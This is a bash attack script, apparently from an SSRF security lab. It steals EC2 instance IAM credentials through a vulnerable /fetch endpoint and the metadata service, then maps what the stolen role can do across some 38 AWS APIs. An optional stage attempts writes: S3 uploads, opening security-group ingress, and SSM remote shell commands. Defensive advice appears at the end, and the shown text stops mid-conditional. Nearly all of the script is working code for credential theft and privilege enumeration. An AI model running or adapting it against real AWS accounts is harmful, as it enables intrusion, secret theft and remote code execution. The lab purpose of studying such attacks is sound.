#!/usr/bin/env bash
# =============================================================================
# 15_iam_blast_radius.sh — Comprehensive IAM Blast Radius Mapping
# =============================================================================
# Purpose:
#   Using IAM credentials stolen via SSRF, comprehensively map the "blast
#   radius" by testing every AWS service API the role might have access to.
#   Outputs a structured permission map showing ALLOWED/DENIED for 30+ APIs.
#
# Attack scenarios:
#   1. Steal and validate IAM credentials via IMDS (same as script 11)
#   2. Level 1: Comprehensive read-only API scan across all major AWS services
#   3. Level 2 (optional): Write operation tests with immediate cleanup
#   4. Permission map summary by category with risk scoring
#   5. JSON output of full permission map
#
# Usage:
#   ./15_iam_blast_radius.sh           # Level 1 read-only scan
#   ./15_iam_blast_radius.sh --level2  # Level 1 + Level 2 write tests
#
# Learning points:
#   - IAM blast radius is IDENTICAL for Config A and Config B
#   - IAM credentials operate via the AWS control plane (API), which is
#     completely independent of VPC network topology
#   - Moving EC2 to a private subnet provides zero protection against
#     IAM credential abuse
#   - Enforcing IMDSv2 and least-privilege IAM are the essential defenses
#
# Prerequisites:
#   - AWS CLI must be installed
#   - An IAM role must be attached to the EC2 instance
#   - The /fetch endpoint with SSRF vulnerability must exist
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

# =============================================================================
# Argument parsing
# =============================================================================
LEVEL2=false
for arg in "$@"; do
    case "${arg}" in
        --level2)
            LEVEL2=true
            ;;
    esac
done

init_config

print_header "15: Comprehensive IAM Blast Radius Mapping"

RESULT_FILE="15_iam_blast_radius.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

if [[ "${LEVEL2}" == "true" ]]; then
    echo -e "${YELLOW}[!] WARNING: --level2 enabled. Write operations will be attempted. Auto-cleanup on exit.${NC}"
    echo ""
fi

# API result counters
ALLOWED_COUNT=0
DENIED_COUNT=0
ERROR_COUNT=0
TOTAL_COUNT=0

# Storage for per-API results (parallel arrays)
declare -a RESULT_SERVICES=()
declare -a RESULT_APIS=()
declare -a RESULT_DESCS=()
declare -a RESULT_STATUS=()

# Category counters (Compute Storage Database Security Networking Monitoring Management)
declare -A CAT_ALLOWED=()
declare -A CAT_DENIED=()
declare -A CAT_ERROR=()

for cat in Compute Storage Database Security Networking Monitoring Management; do
    CAT_ALLOWED["${cat}"]=0
    CAT_DENIED["${cat}"]=0
    CAT_ERROR["${cat}"]=0
done

# =============================================================================
# Step 1: Credential theft and validation
# =============================================================================
# Retrieve the IAM role name and temporary credentials from IMDS via SSRF,
# then validate them with aws sts get-caller-identity.
# =============================================================================
print_header "Step 1: Credential Theft and Validation"

result_text+="==============================="$'\n'
result_text+="Step 1: Credential Theft and Validation"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Retrieving IAM role name from IMDS via SSRF${NC}"

iam_role=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

if [[ -z "${iam_role}" ]] || echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml"; then
    echo -e "${YELLOW}[!] Unable to detect IAM role${NC}"

    imds_check=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_check=""
    if echo "${imds_check}" | grep -qi "Token required\|unauthorized\|401"; then
        print_blocked "IMDSv2 enforced — IMDS access blocked from SSRF"
        result_text+="IMDSv2 enforced: SSRF access blocked"$'\n'
    elif [[ -z "${imds_check}" ]]; then
        print_info "Cannot reach IMDS or application"
        result_text+="IMDS: Unreachable"$'\n'
    else
        print_info "IMDS is accessible but no IAM role is attached"
        result_text+="IAM role: None (metadata access possible)"$'\n'
    fi

    save_result "${RESULT_FILE}" "${result_text}"
    log "IAM blast radius test: Exiting — no IAM role found"
    exit 0
fi

echo -e "${RED}  IAM role: ${iam_role}${NC}"
result_text+="IAM role: ${iam_role}"$'\n'

echo -e "${BLUE}[*] Retrieving temporary credentials...${NC}"
creds_json=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds_json=""

if [[ -z "${creds_json}" ]] || ! echo "${creds_json}" | grep -qi "AccessKeyId"; then
    echo -e "${RED}[!] Failed to retrieve credentials${NC}"
    echo -e "  Response: ${creds_json:0:200}"
    result_text+="Credential retrieval: Failed"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

export AWS_ACCESS_KEY_ID=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null)
export AWS_SECRET_ACCESS_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null)
export AWS_SESSION_TOKEN=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])" 2>/dev/null)

echo -e "${RED}  Credentials loaded into environment variables${NC}"
echo -e "  AccessKeyId: ${AWS_ACCESS_KEY_ID}"
result_text+="AccessKeyId: ${AWS_ACCESS_KEY_ID}"$'\n'

region=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/region" 2>/dev/null) || region=""
if [[ -z "${region}" ]] || echo "${region}" | grep -qi "404\|error"; then
    az_val=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az_val=""
    if [[ -n "${az_val}" ]]; then
        region="${az_val%[a-z]}"
    else
        region="ap-northeast-1"
    fi
fi
export AWS_DEFAULT_REGION="${region}"
echo -e "  Region: ${region}"
result_text+="Region: ${region}"$'\n'

echo ""
echo -e "${BLUE}[*] Validating credentials: aws sts get-caller-identity${NC}"
caller_id=$(aws sts get-caller-identity --output json 2>&1) || caller_id="Failed"

if echo "${caller_id}" | grep -qi "UserId"; then
    echo "${caller_id}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${caller_id}"

    account_id=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" 2>/dev/null || echo "unknown")
    role_arn=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" 2>/dev/null || echo "unknown")
    user_id=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['UserId'])" 2>/dev/null || echo "unknown")

    result_text+="AccountId: ${account_id}"$'\n'
    result_text+="Arn: ${role_arn}"$'\n'
    result_text+="UserId: ${user_id}"$'\n'

    print_vulnerable "Credential theft and validation succeeded — AccountId: ${account_id}"
else
    echo -e "${RED}[!] Credentials are invalid${NC}"
    echo "    ${caller_id}"
    result_text+="Credential validation: Failed — ${caller_id}"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

echo ""

# Trap for environment variable cleanup
# Also cleans up any Level 2 resources created during the run
_l2_test_bucket=""
_l2_sg_id=""
_l2_sg_rule_created=false

cleanup() {
    # Level 2 cleanup: S3 test object
    if [[ -n "${_l2_test_bucket}" ]]; then
        aws s3 rm "s3://${_l2_test_bucket}/blast-radius-test-object.txt" 2>/dev/null || true
    fi
    # Level 2 cleanup: SG ingress rule
    if [[ "${_l2_sg_rule_created}" == "true" ]] && [[ -n "${_l2_sg_id}" ]]; then
        aws ec2 revoke-security-group-ingress \
            --group-id "${_l2_sg_id}" \
            --protocol tcp --port 19999 --cidr 203.0.113.0/32 2>/dev/null || true
    fi
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}
trap cleanup EXIT

# =============================================================================
# Step 2: Comprehensive Read-Only API Scan (Level 1)
# =============================================================================
# Test 30+ AWS service APIs and record ALLOWED / DENIED / ERROR for each.
# =============================================================================
print_header "Step 2: Comprehensive Read-Only API Scan (Level 1)"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 2: Comprehensive Read-Only API Scan (Level 1)"$'\n'
result_text+="==============================="$'\n'

# Format: "service:api_command:description:category"
declare -a API_TESTS=(
    # Compute
    "ec2:describe-instances:EC2 instance list:Compute"
    "ec2:describe-vpcs:VPC configuration:Compute"
    "ec2:describe-security-groups:Security group rules:Compute"
    "ec2:describe-subnets:Subnet layout:Compute"
    "ec2:describe-route-tables:Route tables:Compute"
    "ec2:describe-network-interfaces:Network interfaces:Compute"
    "ec2:describe-vpc-endpoints:VPC endpoints:Compute"
    "ec2:describe-nat-gateways:NAT gateways:Compute"
    "ec2:describe-images:AMI images (self-owned):Compute"
    "ec2:describe-snapshots:EBS snapshots (self-owned):Compute"
    "lambda:list-functions:Lambda functions:Compute"
    "ecs:list-clusters:ECS clusters:Compute"
    "eks:list-clusters:EKS clusters:Compute"
    # Storage
    "s3api:list-buckets:S3 buckets:Storage"
    # Database
    "rds:describe-db-instances:RDS instances:Database"
    "rds:describe-db-snapshots:RDS snapshots:Database"
    "dynamodb:list-tables:DynamoDB tables:Database"
    "elasticache:describe-cache-clusters:ElastiCache clusters:Database"
    # Security
    "iam:list-users:IAM users:Security"
    "iam:list-roles:IAM roles:Security"
    "iam:list-policies:IAM policies (local):Security"
    "iam:get-account-summary:IAM account summary:Security"
    "kms:list-keys:KMS encryption keys:Security"
    "secretsmanager:list-secrets:Secrets Manager:Security"
    "ssm:describe-parameters:SSM Parameter Store:Security"
    # Networking
    "ec2:describe-network-acls:Network ACLs:Networking"
    "ec2:describe-flow-logs:VPC Flow Logs config:Networking"
    "elbv2:describe-load-balancers:ALB/NLB load balancers:Networking"
    "elbv2:describe-target-groups:ALB target groups:Networking"
    # Monitoring
    "logs:describe-log-groups:CloudWatch log groups:Monitoring"
    "cloudwatch:describe-alarms:CloudWatch alarms:Monitoring"
    "cloudtrail:describe-trails:CloudTrail trails:Monitoring"
    "config:describe-config-rules:AWS Config rules:Monitoring"
    # Management
    "organizations:describe-organization:AWS Organizations:Management"
    "sts:get-caller-identity:STS identity (validation):Management"
    "budgets:describe-budgets:AWS Budgets:Management"
    "sns:list-topics:SNS topics:Management"
    "sqs:list-queues:SQS queues:Management"
)

# Run a single read-only API test and return ALLOWED / DENIED / ERROR
run_api_test() {
    local service="$1" api="$2"
    local cmd_args=""

    case "${service}:${api}" in
        ec2:describe-images)    cmd_args="--owners self" ;;
        ec2:describe-snapshots) cmd_args="--owner-ids self" ;;
        iam:list-policies)      cmd_args="--scope Local" ;;
        budgets:describe-budgets) cmd_args="--account-id ${account_id}" ;;
    esac

    local result
    # shellcheck disable=SC2086
    result=$(aws "${service}" "${api}" ${cmd_args} --output json 2>&1) || true

    if echo "${result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized\|not authorized"; then
        echo "DENIED"
    elif echo "${result}" | grep -qi "error\|exception"; then
        echo "ERROR"
    else
        echo "ALLOWED"
    fi
}

# Print table header
echo -e "${BOLD}  $(printf '%-20s' 'Service')$(printf '%-35s' 'API')$(printf '%-10s' 'Status')  Category${NC}"
echo -e "  $(printf '%.0s─' {1..75})"

for test_entry in "${API_TESTS[@]}"; do
    IFS=: read -r svc api desc cat <<< "${test_entry}"

    status=$(run_api_test "${svc}" "${api}")

    # Store for JSON output
    RESULT_SERVICES+=("${svc}")
    RESULT_APIS+=("${api}")
    RESULT_DESCS+=("${desc}")
    RESULT_STATUS+=("${status}")

    # Update category counters
    case "${status}" in
        ALLOWED)
            ((ALLOWED_COUNT++)) || true
            CAT_ALLOWED["${cat}"]=$(( ${CAT_ALLOWED["${cat}"]} + 1 ))
            status_colored="${RED}ALLOWED${NC}"
            ;;
        DENIED)
            ((DENIED_COUNT++)) || true
            CAT_DENIED["${cat}"]=$(( ${CAT_DENIED["${cat}"]} + 1 ))
            status_colored="${GREEN}DENIED${NC}"
            ;;
        ERROR)
            ((ERROR_COUNT++)) || true
            CAT_ERROR["${cat}"]=$(( ${CAT_ERROR["${cat}"]} + 1 ))
            status_colored="${YELLOW}ERROR${NC}"
            ;;
    esac
    ((TOTAL_COUNT++)) || true

    echo -e "  $(printf '%-20s' "${svc}")$(printf '%-35s' "${api}")${status_colored}  ${desc}"
    result_text+="[${status}] ${svc}:${api} — ${desc}"$'\n'
done

echo ""

# =============================================================================
# Step 3: Write Operation Tests (Level 2)
# =============================================================================
# Only executed when --level2 is passed. Each write operation is immediately
# cleaned up (and again on EXIT trap). Results are appended to the same map.
# =============================================================================
declare -a L2_SERVICES=()
declare -a L2_APIS=()
declare -a L2_DESCS=()
declare -a L2_STATUS=()

if [[ "${LEVEL2}" == "true" ]]; then
    print_header "Step 3: Write Operation Tests (Level 2)"

    result_text+=$'\n'"==============================="$'\n'
    result_text+="Step 3: Write Operation Tests (Level 2)"$'\n'
    result_text+="==============================="$'\n'

    # ------------------------------------------------------------------
    # 3a: S3 — create a test object then delete it
    # ------------------------------------------------------------------
    echo -e "${YELLOW}[!] Level 2 write test: S3 PutObject${NC}"
    s3_buckets_raw=$(aws s3api list-buckets --output json 2>&1) || s3_buckets_raw=""
    first_bucket=$(echo "${s3_buckets_raw}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    buckets = data.get('Buckets', [])
    if buckets:
        print(buckets[0]['Name'])
except:
    pass
" 2>/dev/null || echo "")

    if [[ -n "${first_bucket}" ]]; then
        _l2_test_bucket="${first_bucket}"
        s3_put_output=$(aws s3 cp /dev/stdin "s3://${first_bucket}/blast-radius-test-object.txt" \
            <<< "blast-radius-write-test" 2>&1) || s3_put_output="${?}"
        if echo "${s3_put_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
            s3_write_status="DENIED"
            print_blocked "s3 PutObject: AccessDenied"
        elif echo "${s3_put_output}" | grep -qi "error\|exception"; then
            s3_write_status="ERROR"
            print_info "s3 PutObject: Error — ${s3_put_output:0:100}"
        else
            s3_write_status="ALLOWED"
            print_vulnerable "s3 PutObject succeeded on s3://${first_bucket}"
            # Immediate cleanup
            aws s3 rm "s3://${first_bucket}/blast-radius-test-object.txt" 2>/dev/null || true
            _l2_test_bucket=""
        fi
    else
        s3_write_status="ERROR"
        print_info "s3 PutObject: Skipped — no accessible bucket to test against"
    fi

    L2_SERVICES+=("s3")
    L2_APIS+=("put-object")
    L2_DESCS+=("S3 object write")
    L2_STATUS+=("${s3_write_status}")
    result_text+="[${s3_write_status}] s3:put-object — S3 object write"$'\n'

    # ------------------------------------------------------------------
    # 3b: EC2 Security Group — authorize ingress then revoke
    # ------------------------------------------------------------------
    echo ""
    echo -e "${YELLOW}[!] Level 2 write test: EC2 AuthorizeSecurityGroupIngress${NC}"
    sg_list_output=$(aws ec2 describe-security-groups --output json 2>&1) || sg_list_output=""
    first_sg=$(echo "${sg_list_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    sgs = data.get('SecurityGroups', [])
    if sgs:
        print(sgs[0]['GroupId'])
except:
    pass
" 2>/dev/null || echo "")

    if [[ -n "${first_sg}" ]]; then
        _l2_sg_id="${first_sg}"
        sg_auth_output=$(aws ec2 authorize-security-group-ingress \
            --group-id "${first_sg}" \
            --protocol tcp --port 19999 --cidr 203.0.113.0/32 \
            --output json 2>&1) || sg_auth_output=""
        if echo "${sg_auth_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
            sg_write_status="DENIED"
            print_blocked "ec2 AuthorizeSecurityGroupIngress: AccessDenied"
        elif echo "${sg_auth_output}" | grep -qi "error\|exception"; then
            sg_write_status="ERROR"
            print_info "ec2 AuthorizeSecurityGroupIngress: Error — ${sg_auth_output:0:100}"
        else
            sg_write_status="ALLOWED"
            _l2_sg_rule_created=true
            print_vulnerable "ec2 AuthorizeSecurityGroupIngress succeeded on ${first_sg}"
            # Immediate cleanup
            aws ec2 revoke-security-group-ingress \
                --group-id "${first_sg}" \
                --protocol tcp --port 19999 --cidr 203.0.113.0/32 2>/dev/null || true
            _l2_sg_rule_created=false
        fi
    else
        sg_write_status="ERROR"
        print_info "ec2 AuthorizeSecurityGroupIngress: Skipped — no accessible SG to test against"
    fi

    L2_SERVICES+=("ec2")
    L2_APIS+=("authorize-security-group-ingress")
    L2_DESCS+=("Security group rule write")
    L2_STATUS+=("${sg_write_status}")
    result_text+="[${sg_write_status}] ec2:authorize-security-group-ingress — Security group rule write"$'\n'

    # ------------------------------------------------------------------
    # 3c: CloudWatch Logs — create log group (cannot be undone trivially)
    # ------------------------------------------------------------------
    echo ""
    echo -e "${YELLOW}[!] Level 2 write test: CloudWatch Logs CreateLogGroup${NC}"
    test_log_group="/blast-radius-test-$(date +%s)"
    cw_put_output=$(aws logs create-log-group \
        --log-group-name "${test_log_group}" \
        --output json 2>&1) || cw_put_output=""
    if echo "${cw_put_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
        cw_write_status="DENIED"
        print_blocked "logs CreateLogGroup: AccessDenied"
    elif echo "${cw_put_output}" | grep -qi "error\|exception"; then
        cw_write_status="ERROR"
        print_info "logs CreateLogGroup: Error — ${cw_put_output:0:100}"
    else
        cw_write_status="ALLOWED"
        print_vulnerable "logs CreateLogGroup succeeded — group: ${test_log_group}"
        # Immediate cleanup
        aws logs delete-log-group --log-group-name "${test_log_group}" 2>/dev/null || true
    fi

    L2_SERVICES+=("logs")
    L2_APIS+=("create-log-group")
    L2_DESCS+=("CloudWatch Logs write")
    L2_STATUS+=("${cw_write_status}")
    result_text+="[${cw_write_status}] logs:create-log-group — CloudWatch Logs write"$'\n'

    # ------------------------------------------------------------------
    # 3d: SSM SendCommand — attempt whoami (dry-run: AccessDenied expected)
    # ------------------------------------------------------------------
    echo ""
    echo -e "${YELLOW}[!] Level 2 write test: SSM SendCommand (whoami)${NC}"
    ssm_instances_output=$(aws ssm describe-instance-information --output json 2>&1) || ssm_instances_output=""
    first_ssm_instance=$(echo "${ssm_instances_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    instances = data.get('InstanceInformationList', [])
    if instances:
        print(instances[0]['InstanceId'])
except:
    pass
" 2>/dev/null || echo "")

    if [[ -n "${first_ssm_instance}" ]]; then
        ssm_send_output=$(aws ssm send-command \
            --instance-ids "${first_ssm_instance}" \
            --document-name "AWS-RunShellScript" \
            --parameters 'commands=["whoami"]' \
            --output json 2>&1) || ssm_send_output=""
        if echo "${ssm_send_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
            ssm_write_status="DENIED"
            print_blocked "ssm SendCommand: AccessDenied"
        elif echo "${ssm_send_output}" | grep -qi "CommandId"; then
            ssm_write_status="ALLOWED"
            cmd_id=$(echo "${ssm_send_output}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")
            print_vulnerable "ssm SendCommand succeeded! CommandId: ${cmd_id} — Remote code execution possible"
        else
            ssm_write_status="ERROR"
            print_info "ssm SendCommand: Unexpected response — ${ssm_send_output:0:100}"
        fi
    else
        ssm_write_status="ERROR"
        print_info "ssm SendCommand: Skipped — no SSM-managed instances found"
    fi

    L2_SERVICES+=("ssm")
    L2_APIS+=("send-command")
    L2_DESCS+=("SSM remote command execution")
    L2_STATUS+=("${ssm_write_status}")
    result_text+="[${ssm_write_status}] ssm:send-command — SSM remote command execution"$'\n'

    # Tally Level 2 results into global counters
    for l2_status in "${L2_STATUS[@]}"; do
        case "${l2_status}" in
            ALLOWED) ((ALLOWED_COUNT++)) || true ;;
            DENIED)  ((DENIED_COUNT++)) || true ;;
            ERROR)   ((ERROR_COUNT++)) || true ;;
        esac
        ((TOTAL_COUNT++)) || true
    done

    echo ""
fi

# =============================================================================
# Step 4: Permission Map Summary
# =============================================================================
print_header "Step 4: Permission Map Summary"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 4: Permission Map Summary"$'\n'
result_text+="==============================="$'\n'

if [[ "${TOTAL_COUNT}" -gt 0 ]]; then
    blast_radius_pct=$(( ALLOWED_COUNT * 100 / TOTAL_COUNT ))
else
    blast_radius_pct=0
fi

echo -e "${BOLD}  ═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  IAM Blast Radius Report  [${CONFIG_LABEL}]${NC}"
echo -e "${BOLD}  ═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${BOLD}  $(printf '%-18s' 'Category')$(printf '%-9s' 'ALLOWED')$(printf '%-9s' 'DENIED')$(printf '%-9s' 'ERROR')$(printf '%-8s' 'Total')Risk${NC}"
echo -e "  $(printf '%.0s─' {1..65})"

overall_risk="LOW"

for cat in Compute Storage Database Security Networking Monitoring Management; do
    cat_allowed=${CAT_ALLOWED["${cat}"]}
    cat_denied=${CAT_DENIED["${cat}"]}
    cat_error=${CAT_ERROR["${cat}"]}
    cat_total=$(( cat_allowed + cat_denied + cat_error ))

    if [[ "${cat_total}" -eq 0 ]]; then
        cat_risk="N/A"
        risk_color="${CYAN}"
    elif [[ "${cat_allowed}" -eq "${cat_total}" ]]; then
        cat_risk="CRITICAL"
        risk_color="${RED}"
        overall_risk="CRITICAL"
    elif [[ "${cat_allowed}" -gt $(( cat_total / 2 )) ]]; then
        cat_risk="HIGH"
        risk_color="${RED}"
        [[ "${overall_risk}" != "CRITICAL" ]] && overall_risk="HIGH"
    elif [[ "${cat_allowed}" -gt 0 ]]; then
        cat_risk="MEDIUM"
        risk_color="${YELLOW}"
        [[ "${overall_risk}" == "LOW" ]] && overall_risk="MEDIUM"
    else
        cat_risk="LOW"
        risk_color="${GREEN}"
    fi

    echo -e "  $(printf '%-18s' "${cat}")$(printf '%-9s' "${cat_allowed}")$(printf '%-9s' "${cat_denied}")$(printf '%-9s' "${cat_error}")$(printf '%-8s' "${cat_total}")${risk_color}${cat_risk}${NC}"
    result_text+="  ${cat}: ALLOWED=${cat_allowed} DENIED=${cat_denied} ERROR=${cat_error} Total=${cat_total} Risk=${cat_risk}"$'\n'
done

echo -e "  $(printf '%.0s─' {1..65})"
echo -e "${BOLD}  $(printf '%-18s' 'TOTAL')$(printf '%-9s' "${ALLOWED_COUNT}")$(printf '%-9s' "${DENIED_COUNT}")$(printf '%-9s' "${ERROR_COUNT}")$(printf '%-8s' "${TOTAL_COUNT}")${RED}${overall_risk}${NC}"
echo ""

if [[ "${blast_radius_pct}" -ge 70 ]]; then
    br_color="${RED}"
elif [[ "${blast_radius_pct}" -ge 40 ]]; then
    br_color="${YELLOW}"
else
    br_color="${GREEN}"
fi

echo -e "  ${BOLD}Blast Radius Score: ${br_color}${blast_radius_pct}% (${ALLOWED_COUNT}/${TOTAL_COUNT} APIs accessible)${NC}"
echo ""

result_text+="Blast Radius Score: ${blast_radius_pct}% (${ALLOWED_COUNT}/${TOTAL_COUNT} APIs accessible)"$'\n'
result_text+="Overall Risk: ${overall_risk}"$'\n'

# =============================================================================
# Step 5: JSON Output
# =============================================================================
print_header "Step 5: JSON Permission Map Output"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 5: JSON Permission Map Output"$'\n'
result_text+="==============================="$'\n'

json_file="${RESULTS_DIR}/15_iam_blast_radius.json"
timestamp=$(date -u '+%Y-%m-%dT%H:%M:%SZ')

# Build api_results JSON array
api_results_json=""
api_index=0
total_entries=${#RESULT_SERVICES[@]}
for (( i=0; i<total_entries; i++ )); do
    comma=","
    if [[ $(( i + 1 )) -eq "${total_entries}" ]] && [[ "${LEVEL2}" != "true" ]]; then
        comma=""
    fi
    api_results_json+="    {\"service\": \"${RESULT_SERVICES[$i]}\", \"api\": \"${RESULT_APIS[$i]}\", \"desc\": \"${RESULT_DESCS[$i]}\", \"result\": \"${RESULT_STATUS[$i]}\"}${comma}"$'\n'
done

if [[ "${LEVEL2}" == "true" ]]; then
    l2_total=${#L2_SERVICES[@]}
    for (( i=0; i<l2_total; i++ )); do
        comma=","
        if [[ $(( i + 1 )) -eq "${l2_total}" ]]; then
            comma=""
        fi
        api_results_json+="    {\"service\": \"${L2_SERVICES[$i]}\", \"api\": \"${L2_APIS[$i]}\", \"desc\": \"${L2_DESCS[$i]}\", \"result\": \"${L2_STATUS[$i]}\", \"level\": 2}${comma}"$'\n'
    done
fi

# Build categories JSON object
categories_json=""
for cat in Compute Storage Database Security Networking Monitoring Management; do
    categories_json+="    \"${cat}\": {\"allowed\": ${CAT_ALLOWED["${cat}"]}, \"denied\": ${CAT_DENIED["${cat}"]}, \"error\": ${CAT_ERROR["${cat}"]}},"$'\n'
done
# Remove trailing comma from last entry
categories_json="${categories_json%,*}"$'\n'"    \"Management\": {\"allowed\": ${CAT_ALLOWED["Management"]}, \"denied\": ${CAT_DENIED["Management"]}, \"error\": ${CAT_ERROR["Management"]}}"$'\n'

# Write JSON file
cat > "${json_file}" << ENDJSON
{
  "config_mode": "${CONFIG_MODE}",
  "timestamp": "${timestamp}",
  "account_id": "${account_id}",
  "role_arn": "${role_arn}",
  "level2_enabled": ${LEVEL2},
  "summary": {
    "allowed": ${ALLOWED_COUNT},
    "denied": ${DENIED_COUNT},
    "error": ${ERROR_COUNT},
    "total": ${TOTAL_COUNT},
    "blast_radius_pct": ${blast_radius_pct},
    "overall_risk": "${overall_risk}"
  },
  "categories": {
    "Compute":    {"allowed": ${CAT_ALLOWED["Compute"]},    "denied": ${CAT_DENIED["Compute"]},    "error": ${CAT_ERROR["Compute"]}},
    "Storage":    {"allowed": ${CAT_ALLOWED["Storage"]},    "denied": ${CAT_DENIED["Storage"]},    "error": ${CAT_ERROR["Storage"]}},
    "Database":   {"allowed": ${CAT_ALLOWED["Database"]},   "denied": ${CAT_DENIED["Database"]},   "error": ${CAT_ERROR["Database"]}},
    "Security":   {"allowed": ${CAT_ALLOWED["Security"]},   "denied": ${CAT_DENIED["Security"]},   "error": ${CAT_ERROR["Security"]}},
    "Networking": {"allowed": ${CAT_ALLOWED["Networking"]}, "denied": ${CAT_DENIED["Networking"]}, "error": ${CAT_ERROR["Networking"]}},
    "Monitoring": {"allowed": ${CAT_ALLOWED["Monitoring"]}, "denied": ${CAT_DENIED["Monitoring"]}, "error": ${CAT_ERROR["Monitoring"]}},
    "Management": {"allowed": ${CAT_ALLOWED["Management"]}, "denied": ${CAT_DENIED["Management"]}, "error": ${CAT_ERROR["Management"]}}
  },
  "api_results": [
${api_results_json}  ]
}
ENDJSON

echo -e "${BLUE}[*] JSON permission map saved: ${json_file}${NC}"
result_text+="JSON output: ${json_file}"$'\n'

# =============================================================================
# Step 6: Config Comparison Note and Final Verdict
# =============================================================================
print_header "Step 6: Config A vs Config B Comparison"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 6: Config A vs Config B Comparison"$'\n'
result_text+="==============================="$'\n'

echo -e "${RED}${BOLD}  ============================================================${NC}"
echo -e "${RED}${BOLD}  KEY FINDING: Config A and Config B produce IDENTICAL results${NC}"
echo -e "${RED}${BOLD}  ============================================================${NC}"
echo ""
echo -e "  IAM blast radius is IDENTICAL for Config A and Config B."
echo -e "  IAM credentials operate via the AWS control plane (API),"
echo -e "  which is completely independent of VPC network topology."
echo -e "  Moving EC2 to a private subnet provides ZERO protection"
echo -e "  against IAM credential abuse."
echo ""
echo -e "${BOLD}  Recommended Defenses:${NC}"
echo ""
echo -e "  1. ${CYAN}Enforce IMDSv2${NC} (http_tokens = 'required')"
echo -e "     -> Fundamentally blocks IMDS access from SSRF"
echo ""
echo -e "  2. ${CYAN}IAM Least Privilege Principle${NC}"
echo -e "     -> Grant only the minimum required permissions per service"
echo ""
echo -e "  3. ${CYAN}SCP (Service Control Policies)${NC}"
echo -e "     -> Restrict dangerous APIs (iam:*, s3:*) at the organization level"
echo ""
echo -e "  4. ${CYAN}aws:SourceVpc / aws:SourceVpce Condition Keys${NC}"
echo -e "     -> Restrict API calls to originate only from specific VPCs/endpoints"
echo ""
echo -e "  5. ${CYAN}Amazon GuardDuty${NC}"
echo -e "     -> Detect anomalous API call patterns from unusual source IPs"
echo ""
echo -e "  6. ${CYAN}CloudTrail + Alerting${NC}"
echo -e "     -> Alert on sensitive read APIs (iam:List*, secretsmanager:List*)"
echo ""

result_text+="KEY FINDING: IAM blast radius is IDENTICAL for Config A and Config B."$'\n'
result_text+="IAM credentials operate via the AWS control plane (API), completely"$'\n'
result_text+="independent of VPC network topology. Moving EC2 to a private subnet"$'\n'
result_text+="provides ZERO protection against IAM credential abuse."$'\n'
result_text+=$'\n'"Recommended Defenses:"$'\n'
result_text+="1. Enforce IMDSv2 (http_tokens = 'required')"$'\n'
result_text+="2. IAM Least Privilege Principle"$'\n'
result_text+="3. SCP (Service Control Policies)"$'\n'
result_text+="4. aws:SourceVpc / aws:SourceVpce Condition Keys"$'\n'
result_text+="5. Amazon GuardDuty"$'\n'
result_text+="6. CloudTrail + Alerting on sensitive read APIs"$'\n'

# ---------------------------------------------------------------------------
# Overall verdict and save
# ---------------------------------------------------------------------------
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  IAM Blast Radius Final Verdict (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [[ "${blast_radius_pct}" -gt 50 ]]; then
    print_vulnerable "VERDICT: VULNERABLE — Blast radius ${blast_radius_pct}% exceeds 50% threshold"
    result_text+=$'\n'"VERDICT: VULNERABLE — Blast radius ${blast_radius_pct}% (>${50}% threshold)"$'\n'
else
    if [[ "${CAT_ALLOWED["Security"]}" -gt 0 ]] || [[ "${CAT_ALLOWED["Storage"]}" -gt 0 ]]; then
